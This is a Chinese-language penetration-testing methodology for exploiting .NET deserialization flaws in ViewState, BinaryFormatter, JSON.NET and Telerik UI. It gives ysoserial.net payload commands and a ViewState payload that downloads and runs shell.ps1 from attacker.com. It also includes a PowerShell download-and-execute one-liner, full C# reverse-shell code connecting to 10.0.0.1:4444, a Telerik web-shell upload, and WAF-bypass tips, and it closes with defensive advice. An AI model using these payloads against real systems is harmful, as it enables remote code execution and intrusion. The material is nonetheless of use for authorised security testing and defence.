# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 .NET 反序列化漏洞测试与利用流程。通过本方法论，测试人员能够系统性地检测 .NET 应用中的反序列化漏洞，并构造合适的 Payload 进行验证和利用，包括 ViewState、BinaryFormatter、XmlSerializer 等常见反序列化场景的测试方法。

## 1.2 适用范围

本文档适用于以下场景：
- 使用 ViewState 的 ASP.NET Web Forms 应用
- 使用 BinaryFormatter 的 .NET 应用
- 使用 XmlSerializer 的 .NET 服务
- 使用 JSON.NET 的 API 接口
- 使用 .NET Remoting 的遗留系统
- 使用 WCF 的服务端点

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行 .NET 应用安全审计的顾问
- 负责 .NET 应用安全开发的技术人员
- 安全研究人员

---

# 第二部分：核心渗透技术专题

## 专题一：.NET 反序列化漏洞测试

### 2.1 技术介绍

.NET 反序列化漏洞是指当应用反序列化来自不可信来源的数据时，攻击者可以构造恶意序列化数据，在反序列化过程中执行任意代码。

**漏洞原理：**
- .NET 提供多种序列化机制（BinaryFormatter、XmlSerializer、DataContractSerializer 等）
- 反序列化时会调用特定方法（如 `OnDeserialized` 属性标记的方法）
- 某些类的反序列化逻辑中存在 gadget 链可被利用
- ViewState 机制如果配置不当也可能被利用

**常见 Gadget 库：**
- System.Configuration.Install.AssemblyInstaller
- System.Windows.Forms.AxHost
- Microsoft.IdentityModel.Claims
- Newtonsoft.Json 相关类
- Telerik UI for ASP.NET AJAX

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **ASP.NET Web Forms** | ViewState 处理 | ViewState 未加密或 MAC 被禁用 |
| **.NET Remoting** | 远程对象调用 | 二进制反序列化未验证数据 |
| **WCF 服务** | SOAP 消息处理 | SOAP 消息反序列化 |
| **API 接口** | JSON/XML 请求处理 | JSON.NET 反序列化配置不当 |
| **文件处理** | 序列化文件导入 | 导入的文件被反序列化 |
| **缓存系统** | Redis/内存缓存 | 缓存数据反序列化 |
| **Session 状态** | Session 持久化 | Session 数据序列化存储 |
| **第三方组件** | Telerik、DevExpress | 组件内置反序列化漏洞 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**反序列化点识别：**

1. **识别 ViewState**
   ```bash
   # 检查页面隐藏字段
   curl https://target.com/page.aspx | grep -i "__VIEWSTATE"
   
   # ViewState 特征
   # - Base64 编码
   # - 通常以 /wEP 开头
   
   # 检查 ViewState 是否加密
   # 如果可读，可能未加密
   ```

2. **识别 .NET 序列化特征**
   ```bash
   # BinaryFormatter 序列化数据特征
   # 通常以 00 01 开头
   
   # JSON.NET 类型信息
   # $type 字段暴露类名
   {
     "$type": "System.Windows.Forms.AxHost+State, System.Windows.Forms",
     ...
   }
   ```

3. **使用工具探测**
   ```bash
   # 使用 ysoserial.net 生成探测 Payload
   ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo test"
   
   # 使用 Burp Suite 插件
   # -ViewState Editor
   # -JSON.NET 类型注入检测
   ```

4. **时间延迟探测**
   ```bash
   # 生成时间延迟 Payload
   ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "sleep 5000"
   
   # 发送并观察响应时间
   curl -X POST https://target.com/page.aspx \
     -d "__VIEWSTATE=生成的 Payload"
   ```

#### 2.3.2 白盒测试

**代码审计要点：**

1. **搜索反序列化相关代码**
   ```csharp
   // 危险模式：BinaryFormatter
   BinaryFormatter formatter = new BinaryFormatter();
   object obj = formatter.Deserialize(stream);
   
   // 危险模式：XmlSerializer
   XmlSerializer serializer = new XmlSerializer(typeof(object));
   object obj = serializer.Deserialize(stream);
   
   // 危险模式：DataContractSerializer
   DataContractSerializer serializer = new DataContractSerializer(typeof(object));
   object obj = serializer.ReadObject(stream);
   ```

2. **检查 ViewState 配置**
   ```xml
   <!-- 检查 web.config -->
   <pages enableViewStateMac="false" />  <!-- 危险：禁用 MAC -->
   <pages viewStateEncryptionMode="Never" />  <!-- 危险：不加密 -->
   
   <!-- 安全配置 -->
   <pages enableViewStateMac="true" />
   <pages viewStateEncryptionMode="Always" />
   ```

3. **检查 JSON.NET 配置**
   ```csharp
   // 危险模式：允许类型信息
   JsonSerializerSettings settings = new JsonSerializerSettings {
       TypeNameHandling = TypeNameHandling.All  // 危险
   };
   
   // 安全模式：禁止类型信息
   JsonSerializerSettings settings = new JsonSerializerSettings {
       TypeNameHandling = TypeNameHandling.None
   };
   ```

### 2.4 漏洞利用方法

#### 2.4.1 使用 ysoserial.net 工具

**ysoserial.net 常用 Gadget：**

```bash
# 列出所有可用 Gadget
ysoserial.exe -h

# 生成 ViewState Payload
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo test"

# 生成 BinaryFormatter Payload
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -c "calc.exe"

# 生成 JSON.NET Payload
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc.exe"

# 生成 ActivitySurrogateSelector Payload
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -c "calc.exe"
```

**常见 Gadget 适用场景：**

| Gadget | 适用场景 | .NET 版本 |
|-------|---------|----------|
| **TextFormattingRunProperties** | ViewState | 全版本 |
| **ObjectDataProvider** | BinaryFormatter/JSON.NET | 全版本 |
| **ActivitySurrogateSelector** | BinaryFormatter | 全版本 |
| **ClaimsIdentity** | BinaryFormatter | .NET Framework |
| **SessionSecurityToken** | BinaryFormatter | WIF 相关 |
| **TypeConfuseDelegate** | BinaryFormatter | .NET 4.0-4.5.1 |

#### 2.4.2 ASP.NET ViewState 漏洞利用

**检测 ViewState 配置：**
```bash
# 检查 ViewState 是否启用 MAC
# 如果禁用 MAC，可以直接篡改

# 使用 ViewState 分析工具
# - ViewState Analyzer
# - Blacklist3r
```

**利用 ViewState 漏洞：**
```bash
# 如果 MAC 禁用，生成恶意 ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\""

# 如果 MAC 启用但密钥泄露
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd" --decryptionalg="AES" --decryptionkey="密钥" --validationalg="SHA1" --validationkey="密钥"
```

#### 2.4.3 Telerik UI 漏洞利用

**检测 Telerik：**
```bash
# 检查 Telerik 相关文件
curl https://target.com/Telerik.Web.UI.WebResource.axd

# 检查版本信息
# 旧版本 Telerik 存在反序列化漏洞
```

**利用 Telerik 漏洞：**
```bash
# 使用已知漏洞
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -c "cmd"

# 上传恶意文件
curl -X POST https://target.com/Telerik.Web.UI.WebResource.axd \
  -d "type=rau&path=~/shell.aspx&content=恶意内容"
```

#### 2.4.4 反弹 Shell Payload

```csharp
// PowerShell 反弹 Shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/shell.ps1')"

// C# 代码反弹 Shell
// 在 Gadget 中注入 C# 代码
string host = "10.0.0.1";
int port = 4444;
System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(host, port);
System.IO.Stream stream = client.GetStream();
System.Diagnostics.Process process = new System.Diagnostics.Process();
process.StartInfo.FileName = "cmd.exe";
process.StartInfo.RedirectStandardInput = true;
process.StartInfo.RedirectStandardOutput = true;
process.StartInfo.UseShellExecute = false;
process.Start();
process.StandardInput.BaseStream.CopyTo(stream);
stream.CopyTo(process.StandardOutput.BaseStream);
process.WaitForExit();
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过 ViewState MAC

**方法 1：利用配置错误**
```bash
# 如果不同页面使用相同密钥
# 可以跨页面重用 ViewState

# 如果密钥硬编码在代码中
# 通过反编译获取密钥
```

**方法 2：利用已知密钥**
```bash
# 使用 Blacklist3r 工具
# 如果目标使用默认或常见密钥
# 可以生成有效 ViewState
```

#### 2.5.2 绕过类型检查

**方法 1：利用类型混淆**
```csharp
// 如果应用允许特定类型
// 可以继承该类型并添加恶意逻辑

public class MaliciousType : AllowedType {
    [OnDeserialized]
    public void OnDeserialized(StreamingContext context) {
        // 恶意代码
    }
}
```

#### 2.5.3 绕过 WAF

**方法 1：编码绕过**
```bash
# Base64 编码
# ViewState 本身就是 Base64，可以再次编码

# URL 编码
# 对 Payload 进行 URL 编码
```

**方法 2：分块传输**
```bash
# 将 Payload 分多个请求发送
# 在服务器端组装
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Gadget | Payload 示例 | 说明 |
|-----|--------|------------|------|
| **ViewState 利用** | TextFormattingRunProperties | `ysoserial.exe -p ViewState -g ...` | ViewState 攻击 |
| **BinaryFormatter** | ObjectDataProvider | `ysoserial.exe -f BinaryFormatter -g ...` | 二进制反序列化 |
| **JSON.NET** | ObjectDataProvider | `ysoserial.exe -f Json.Net -g ...` | JSON 反序列化 |
| **Telerik** | ActivitySurrogateSelector | `ysoserial.exe -f BinaryFormatter -g ...` | Telerik UI 攻击 |
| **命令执行** | 任意 | `-c "powershell payload"` | PowerShell 执行 |

## 3.2 常见 .NET 反序列化漏洞 CVE

| CVE | 受影响组件 | 描述 |
|-----|-----------|------|
| **CVE-2019-0695** | .NET Framework | TypeConfuseDelegate 漏洞 |
| **CVE-2018-8254** | Visual Studio | Team Foundation Server 反序列化 |
| **CVE-2017-0251** | .NET Framework | Silverlight 反序列化 |
| **CVE-2019-18935** | Telerik UI | ASP.NET AJAX 反序列化 |
| **CVE-2017-6521** | Mono | 跨平台 .NET 反序列化 |

## 3.3 .NET 反序列化安全检查清单

- [ ] 禁用 BinaryFormatter
- [ ] ViewState 启用 MAC 和加密
- [ ] JSON.NET 禁用类型信息处理
- [ ] 实施反序列化类白名单
- [ ] 升级有漏洞的组件
- [ ] 使用安全序列化替代方案
- [ ] 监控异常反序列化行为
- [ ] 定期扫描依赖漏洞

## 3.4 防御建议

1. **避免 BinaryFormatter**：使用 System.Text.Json 等安全替代
2. **ViewState 保护**：启用 MAC 和加密
   ```xml
   <pages enableViewStateMac="true" viewStateEncryptionMode="Always" />
   ```
3. **类型信息限制**：JSON.NET 禁用 TypeNameHandling
   ```csharp
   settings.TypeNameHandling = TypeNameHandling.None;
   ```
4. **类白名单**：实施反序列化类白名单
5. **数据签名**：对序列化数据签名验证
6. **组件更新**：及时更新 .NET 框架和第三方组件
7. **最小权限**：应用池使用最小权限运行
8. **安全监控**：监控异常反序列化行为
